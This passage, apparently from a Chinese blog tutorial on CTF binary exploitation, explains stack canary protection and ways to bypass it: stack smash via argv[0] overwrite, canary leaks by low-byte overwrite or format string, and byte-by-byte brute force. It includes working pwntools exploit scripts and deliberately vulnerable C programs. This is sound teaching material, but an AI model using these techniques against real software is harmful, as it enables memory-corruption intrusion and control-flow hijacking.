class="token operator">+</span>     rbp<span class="token operator">-</span><span class="token number">8</span> <span class="token operator">=</span><span class="token operator">&gt;</span>  <span class="token operator">|</span> canary value    <span class="token operator">|</span>               <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>               <span class="token operator">|</span> local variables <span class="token operator">|</span>Low Address    <span class="token operator">|</span>                 <span class="token operator">|</span>       <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>wiki：）x64程序</p><blockquote><p>32位是取gs寄存器的值放在rbp-4处</p></blockquote><p>当程序启用 Canary 编译后，在函数序言部分会取<strong>fs 寄存器 0x28 处的值</strong>，存放在栈中 rbp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    rax, qword ptr fs:[0x28] ;取fs:[0x28]的值给raxmov    qword ptr [rbp - 8], rax ;把rax的值给rbp-8的位置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov    rdx,QWORD PTR [rbp-0x8]xor    rdx,QWORD PTR fs:0x28je     0x4005d7 &lt;main+65&gt;call   0x400460 &lt;__stack_chk_fail@plt&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">eglibc<span class="token operator">-</span><span class="token number">2.19</span><span class="token operator">/</span>debug<span class="token operator">/</span>stack_chk_fail<span class="token punctuation">.</span>c<span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">__stack_chk_fail</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token string">"stack smashing detected"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>noreturn<span class="token punctuation">)</span><span class="token punctuation">)</span> internal_function <span class="token function">__fortify_fail</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token function">__libc_message</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">"*** %s ***: %s terminated\n"</span><span class="token punctuation">,</span>                    msg<span class="token punctuation">,</span> __libc_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">:</span> <span class="token string">"&lt;unknown&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 下文stack smash)。</p><p>进一步，对于 Linux 来说，<strong>fs 寄存器实际指向的是当前栈的 TLS 结构</strong>，fs:0x28 指向的正是 stack_guard。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>  <span class="token keyword">void</span> <span class="token operator">*</span>tcb<span class="token punctuation">;</span>        <span class="token comment">/* Pointer to the TCB.  Not necessarily the                       thread descriptor used by libpthread.  */</span>  <span class="token class-name">dtv_t</span> <span class="token operator">*</span>dtv<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token operator">*</span>self<span class="token punctuation">;</span>       <span class="token comment">/* Pointer to the thread descriptor.  */</span>  <span class="token keyword">int</span> multiple_threads<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> sysinfo<span class="token punctuation">;</span>  <span class="token class-name">uintptr_t</span> stack_guard<span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span> <span class="token class-name">tcbhead_t</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</strong></p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span><span class="token function">security_init</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span>  <span class="token comment">// glibc直接使用了_dl_random的值并没有给赋值</span>  <span class="token comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span>  <span class="token comment">//将_dl_random的最后一个字节设置为0x0</span>  <span class="token class-name">uintptr_t</span> stack_chk_guard <span class="token operator">=</span> <span class="token function">_dl_setup_stack_chk_guard</span> <span class="token punctuation">(</span>_dl_random<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置Canary的值到TLS中</span>  <span class="token function">THREAD_SET_STACK_GUARD</span> <span class="token punctuation">(</span>stack_chk_guard<span class="token punctuation">)</span><span class="token punctuation">;</span>  _dl_random <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">THREAD_SET_STACK_GUARD</span><span class="token expression"><span class="token punctuation">(</span>value<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>  <span class="token expression"><span class="token function">THREAD_SETMEM</span> <span class="token punctuation">(</span>THREAD_SELF<span class="token punctuation">,</span> header<span class="token punctuation">.</span>stack_guard<span class="token punctuation">,</span> value<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -fstack-protector-all -o test test.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func1 int a = %d\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"func2"</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func2 char s[10] = %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"hello  world"</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Func3 char *s = %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">func1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">func3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看func1函数汇编代码：</p><ul><li>可以看到，在func1函数开始时，会把fs:[0x28]的值放在rbp-8处</li><li>func1函数返回时，会检查rbp-8处的值与fs:[0x28]的值是否相等（func2,func3类似</li></ul><p><img src="/2023/04/09/canary/2.png"></p><p><img src="/2023/04/09/canary/1.png"></p><p>当发生栈溢出时：</p><p><img src="/2023/04/09/canary/3.png"></p><h1 id="Canary绕过与利用"><a href="#Canary绕过与利用" class="headerlink" title="Canary绕过与利用"></a>Canary绕过与利用</h1><h2 id="Stack-smash"><a href="#Stack-smash" class="headerlink" title="Stack smash"></a>Stack smash</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在程序加了 canary 保护之后，如果我们读取的 buffer 覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而 stack smash 技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code> 函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。</p><p><strong>所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 <code>__fortify_fail</code> 函数中就会输出我们想要的信息。（相关__stack_chk_fail等函数见上文</strong></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><h4 id="32C3-CTF-readme"><a href="#32C3-CTF-readme" class="headerlink" title="32C3 CTF readme"></a>32C3 CTF readme</h4><p>程序开启了Canary和NX保护</p><p><img src="/2023/04/09/canary/2-1.png"></p><p>程序逻辑：</p><ul><li>该题为读flag题，flag存储在byte_600D20数组中</li><li>首先输入name，这里使用_IO_gets函数，存在溢出</li><li>然后让我们输入flag，我们输入的flag会把byte_600D20数组中的值给覆盖掉，对于我们没有覆盖的byte_600D20中的值，程序会直接把其覆写为0</li></ul><p><img src="/2023/04/09/canary/2-2.png"></p><p>思路：</p><blockquote><ul><li><strong>在 ELF 内存映射时，bss 段会被映射两次</strong>，所以我们可以使用另一处的地址来进行输出，可以使用 gdb 的 find 来进行查找。</li><li>所以byte_600D20中的flag在400D20中其实还有一份，但是得程序加载才会有</li><li>所以我们可以把argv[0]修改为400D20，这样我们触发栈溢出，这样由于Canary保护检测，就会输出保存信息和argv[0]，这样就输出了flag</li></ul></blockquote><p><img src="/2023/04/09/canary/2-4.png"></p><p>查找argv[0]地址：0x7fffffffdf08</p><p><img src="/2023/04/09/canary/2-5.png"></p><p>计算argv[0]距离_IO_gets函数输入点的偏移：0x7fffffffdf08 - 0x7fffffffdcf0 = 536</p><p><img src="/2023/04/09/canary/2-6.png"></p><p>利用栈溢出覆盖argv[0]为0x400D20，exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./smashes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">536</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400D20</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'name? '</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'flag: '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/2-7.png"></p><h4 id="2018-网鼎杯-guess"><a href="#2018-网鼎杯-guess" class="headerlink" title="2018 网鼎杯 - guess"></a>2018 网鼎杯 - guess</h4><p>前置知识：在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments section） 用来存储系统环境变量的一份复制文件，进程在运行时可能需要。 例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。 该节是可写的，因此在格式化字符串和缓冲区溢出攻击中都可以攻击该节。 *environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。</p><p><strong>_environ：</strong></p><ul><li><p><strong>在Linux C中，environ是一个全局变量，它储存着系统的环境变量。</strong></p></li><li><p>它储存在libc中，因此environ是沟通libc地址与栈地址的桥梁。</p></li></ul><p><strong>environ利用：</strong></p><ul><li><strong>通过libc找到environ地址后，泄露environ地址处的值，可以得到环境变量地址，环境变量保存在栈中，通过偏移可以得到栈上任意变量的地址。</strong></li></ul><p>程序开启了Canary和NX保护，程序逻辑如下：</p><ul><li>将flag.txt文件中的flag放入real_flag中</li><li>fork创建子进程（3次，所以我们只有三次机会</li><li>使用gets函数输入猜测的guess_flag，存在溢出</li></ul><p>这题与前面32C3 CTF readme这题类似，唯一不同的是这次的flag是放在了栈上，而不像上一题直接放在BSS段中，所以我们要泄漏flag存放的位置（栈地址</p><p>思路如下：</p><ul><li><p>找到argv[0]与输入点的偏移</p></li><li><p>泄漏存放real_flag的栈地址</p><ul><li>计算real_flag与environ的偏移</li><li>泄漏libc，计算environ的地址，然后泄漏environ栈地址</li><li>计算real_flag的栈地址</li></ul></li><li><p>将argv[0]地址的换成real_flag栈地址，然后触发栈溢出，打印出flag</p></li></ul><p><img src="/2023/04/09/canary/4-1.png"></p><p>1、找到argv[0]与输入点的偏移：0x7fffffffdf08 - 0x7fffffffdde0 = 0x128</p><p><img src="/2023/04/09/canary/4-2.png"></p><p>2、泄漏存放real_flag的栈地址</p><ul><li>计算real_flag与environ的偏移：0x7fffffffdf18 - 0x7fffffffddb0 = 0x168</li><li>泄漏libc，计算environ的地址，然后泄漏environ栈地址：environ_addr</li><li>计算real_flag的栈地址：environ_addr - 0x168</li></ul><p><img src="/2023/04/09/canary/4-3.png"></p><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#context.log_level = 'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>content<span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x128</span> <span class="token operator">+</span> contentio<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'flag\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> flag<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'***: '</span><span class="token punctuation">)</span><span class="token keyword">return</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' terminated'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#泄漏libc</span>puts <span class="token operator">=</span> leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#泄漏put函数got表项内容</span>libc_base <span class="token operator">=</span> puts <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span> <span class="token comment">#计算libc_base</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>environ <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span> <span class="token comment">#计算environ地址</span>environ <span class="token operator">=</span> leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#泄漏栈地址</span>flag <span class="token operator">=</span> environ <span class="token operator">-</span> <span class="token number">0x168</span> <span class="token comment">#计算flag栈地址</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>leak<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> flag<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/09/canary/4-4.png"></p><h2 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>1、Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要多次溢出，第一次溢出泄露 Canary，之后再次溢出控制执行流程。</p><ul><li>可以看到Canary的低字节为00</li></ul><p><img src="/2023/04/09/canary/5-0.png"></p><p>2、格式化字符串直接泄漏Canary的值</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>测试程序（wiki：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -m32 -no-pie -0 leak_canary leak_canary.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">void</span> <span class="token function">getshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该程序开启了Canary和NX保护</p><ul><li>vuln函数中read读入0x200个字符，存在溢出</li><li>vuln函数中printf(buf)存在格式化字符串漏洞</li><li>存在getshell后门函数</li></ul><blockquote><p>有格式化字符串漏洞和后门函数，是不是想hijack retaddr</p><p>有格式化字符串漏洞，并且没有开启RELRO保护，是不是想hijack GOT</p></blockquote><p>1、覆盖 Canary 的低字节</p><p>Canary被放在了ebp - 0xc处，在IDA里面可以看到ebp距离输入点的偏移为0x70 ==&gt; Canary距离输入点的偏移为0x70 - 0xc = 0x64 == 100</p><p><img src="/2023/04/09/canary/5-1.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span>shell <span class="token operator">=</span> <span class="token number">0x80485A4</span><span class="token comment">#把Canary的低字节覆盖为'A'即0x41</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">101</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x41</span><span class="token keyword">print</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">8</span> <span class="token operator">+</span><span class="token string">'dead'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、格式化字符串直接泄漏Canary</p><ul><li>调试得：Canary为格式化字符串的第31个参数 ==&gt; %31$p可以泄漏Canary的值</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./leak_canary"</span><span class="token punctuation">)</span><span class="token comment">#泄漏canary</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'!\n'</span><span class="token punctuation">,</span> <span class="token string">'%31$p'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'canary: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token comment">#ret2text</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">100</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'B'</span><span class="token operator">*</span><span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getshell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="one-by-one爆破Canary"><a href="#one-by-one爆破Canary" class="headerlink" title="one by one爆破Canary"></a>one by one爆破Canary</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的。one by one爆破思想是利用<code>fork</code>函数来不断逐字节泄露。这里介绍一下fork函数，<strong>fork函数作用是通过系统调用创建一个与原来进程几乎完全相同的进程，这里的相同也包括canary</strong>。<font color="red">当程序存在fork函数并触发canary时，__ stack_chk_fail函数<strong>只能关闭fork函数所建立的进程，不会让主进程退出</strong></font>，所以当存在大量调用fork函数时，我们可以利用它来一字节一字节的泄露，所以叫做one by one爆破。</p><h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p>测试代码（上个测试代码稍微修改：</p><ul><li>这道题有fork函数，会循环创建子进程</li><li>没有了printf输出函数</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//gcc -m32 -fstack-protector -o one_by_one one_by_one.c</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span 